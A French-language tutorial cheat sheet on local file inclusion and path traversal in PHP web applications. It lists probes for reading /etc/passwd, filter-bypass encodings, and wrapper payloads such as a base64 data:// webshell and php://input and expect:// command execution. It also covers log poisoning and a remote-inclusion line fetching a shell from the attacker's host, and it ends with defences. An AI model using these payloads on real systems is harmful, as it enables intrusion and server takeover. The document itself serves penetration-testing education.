# LFI & path traversal

Deux failles proches, nées de la même erreur : mettre une entrée utilisateur
dans un chemin de fichier. Le **path traversal** permet de *lire* des fichiers
hors du dossier prévu. La **Local File Inclusion (LFI)**, c'est quand ce chemin
alimente un `include()`, donc le fichier est *exécuté* — un chemin court vers
l'exécution de code.

Tous les exemples sont génériques. Rien ici n'est la solution d'un challenge
précis.

## 1. La repérer

Regarde tout ce qui désigne un fichier ou une page : `?page=`, `?file=`,
`?lang=`, `?template=`, `?download=`. L'indice : la valeur a l'air de finir sur
le disque.

La première sonde sous Linux est toujours la même :

```
?page=../../../../../../etc/passwd
```

Sous Windows :

```
?page=..\..\..\..\windows\win.ini
```

Si le fichier revient, c'est du traversal. Si l'appli semble *exécuter* ce
qu'elle charge (les pages PHP s'affichent au lieu de montrer le source), tu es
sur de la LFI.

## 2. Les bases du traversal

`../` remonte d'un dossier. Empile-en assez pour atteindre la racine, puis
redescends vers la cible. Quelques variantes :

- **chemin absolu** — parfois le préfixe n'est pas forcé, donc
  `?page=/etc/passwd` suffit.
- **extension forcée** — si le code ajoute `.php`, il faut la gérer (voir null
  byte / wrappers plus bas).
- **préfixe forcé** — s'il préfixe un dossier, il suffit d'en sortir avec `../`.

## 3. Contourner les filtres

Les filtres naïfs retirent ou bloquent `../`. Contournements courants :

- **Suppression non récursive** — si le filtre retire `../` une fois, `....//`
  redevient `../` après la suppression. Même idée : `..././`.
- **Encodage URL** — `%2e%2e%2f` pour `../` ; **double encodage**
  `%252e%252e%252f` quand une couche décode avant le contrôle.
- **Overlong / Unicode** — des séquences type `%c0%ae` sur certaines stacks.
- **Null byte** — sur du vieux PHP (< 5.3.4), `?page=/etc/passwd%00` coupe un
  suffixe `.php` forcé.

## 4. Les wrappers PHP (là où la LFI devient dangereuse)

Avec PHP, le « fichier » peut être un wrapper, ce qui transforme une lecture en
bien plus.

**Lire le code source** avec `php://filter` — en base64 pour que les balises PHP
ne s'exécutent pas :

```
?page=php://filter/convert.base64-encode/resource=index.php
```

Décode la sortie et tu as le source (parfait pour trouver la faille suivante,
des identifiants de base, etc.).

**Exécuter du code** quand les wrappers sont autorisés :

```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==   (<?php system($_GET[0]); ?>)
?page=php://input        + corps POST : <?php system('id'); ?>
?page=expect://id
```

## 5. De la LFI au RCE sans wrappers

Quand `data://`/`input` sont coupés, on fait écrire au serveur du texte qu'on
contrôle dans un fichier qu'on pourra ensuite inclure :

- **Log poisoning** — mettre du PHP dans un champ journalisé (ex. `User-Agent`),
  puis inclure le log :
  ```
  User-Agent: <?php system($_GET[0]); ?>
  ?page=../../../../var/log/apache2/access.log&0=id
  ```
- **Fichiers de session** — si une valeur que tu contrôles atterrit dans
  `/var/sess_<id>`, inclus-la.
- **/proc/self/environ** — sur de vieilles configs, empoisonne via `User-Agent`
  et inclus-le.

Et si `allow_url_include` est activé, la LFI devient **RFI** : inclure un fichier
distant directement (`?page=http://toi/shell.txt`).

## 6. Se défendre

- Ne pas mettre d'entrée utilisateur dans un chemin. Si c'est inévitable,
  **whitelister** les valeurs autorisées et mapper côté serveur.
- `basename()` l'entrée et l'épingler à un dossier fixe ; rejeter tout ce qui
  contient `..`, des null bytes ou des schémas.
- Désactiver `allow_url_include` (et `allow_url_fopen` si possible), poser un
  `open_basedir` strict.
- Garder les logs et les dossiers de session hors du périmètre d'inclusion
  accessible depuis le web.

---

Fait par **White** · [github.com/white-exee](https://github.com/white-exee)
